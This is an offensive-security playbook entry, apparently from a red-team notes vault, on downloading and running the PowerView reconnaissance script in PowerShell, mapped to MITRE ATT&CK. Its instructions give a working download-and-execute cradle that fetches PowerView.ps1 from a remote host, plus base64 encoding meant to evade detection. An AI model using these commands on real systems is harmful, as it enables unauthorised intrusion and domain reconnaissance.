---
id: ec8007db-9f27-40c3-91fc-234ec47afc30
name: PowerView Download and Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.016370+00:00'
updated_at: '2023-04-10T20:37:01.802685+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[PowerShell|T1086 - PowerShell]]'
tags:
- '[[Encoded Commands]]'
- '[[Powershell]]'
commands:
- '[[Download PowerView script]]'
---

# PowerView Download and Execution

## Summary

PowerView is a PowerShell tool used for reconnaissance and privilege escalation. The attacker can use this tool to gather information about the target network and identify potential vulnerabilities. The tool can be executed by downloading and executing the PowerView PowerShell script. The attacker 

## Description

# Description

PowerView is a PowerShell tool used for reconnaissance and privilege escalation. The attacker can use this tool to gather information about the target network and identify potential vulnerabilities. The tool can be executed by downloading and executing the PowerView PowerShell script. The attacker can use encoded commands to evade detection and bypass security controls. Once executed, the attacker can use PowerView to enumerate domain users, groups, computers, and shares. This information can be used to identify high-value targets for further exploitation. 

Technical Explanation: The attacker uses PowerShell to download the PowerView script from a remote server and execute it on the target system. The attacker encodes the command to evade detection and bypass security controls. Once executed, PowerView uses built-in PowerShell cmdlets to perform reconnaissance and enumeration of the target network. 

Business Value: An attacker can use PowerView to gather sensitive information about the target network, such as user credentials and system configurations. This information can be used to launch further attacks, such as lateral movement, privilege escalation, and data exfiltration.

## Requirements

1. Authenticated access to the target system

1. PowerShell installed on the target system

## Defense

1. Use endpoint protection software to detect and block malicious PowerShell scripts

1. Monitor network traffic for suspicious PowerShell commands

1. Implement the principle of least privilege to restrict access to sensitive systems and data

## Objectives

1. Download and execute PowerView PowerShell script

1. Enumerate domain users, groups, computers, and shares

# Instructions

1. This command downloads and executes the PowerView PowerShell script from a remote server. The script is used for reconnaissance and privilege escalation in Active Directory environments.

**Code**: [[$command = 'IEX (New-Object Net.WebClient).Downloa]]

> The $command variable contains the PowerShell command to download and execute the PowerView script. The script is downloaded using the .NET WebClient object and then executed using the Invoke-Expression (IEX) cmdlet. The $bytes variable converts the command string to Unicode encoding, and the $encodedCommand variable converts the Unicode string to a base64-encoded string. This is done to bypass any content filters that may be in place on the network.

**Command** ([[Download PowerView script]]):

```bash
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
```

2. This command downloads the PowerView.ps1 script from a remote server using PowerShell's Invoke-Expression cmdlet. The downloaded script can then be used to perform various Active Directory enumeration and exploitation tasks.

**Code**: [[echo 'IEX (New-Object Net.WebClient).DownloadStrin]]

> The 'echo' command sends the PowerShell command to the console. The 'IEX' command is an alias for Invoke-Expression, which executes the code in the parentheses. The code in the parentheses uses the .NET WebClient class to download the contents of the specified URL. The 'iconv' command converts the output encoding to UTF-16LE, which is required by PowerShell. Finally, the 'base64' command encodes the output in base64 format without wrapping lines (-w 0) for easier use in PowerShell scripts.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[PowerShell|T1086 - PowerShell]]

## Commands Used

- [[Download PowerView script]]

## Tags

- [[Encoded Commands]]
- [[Powershell]]
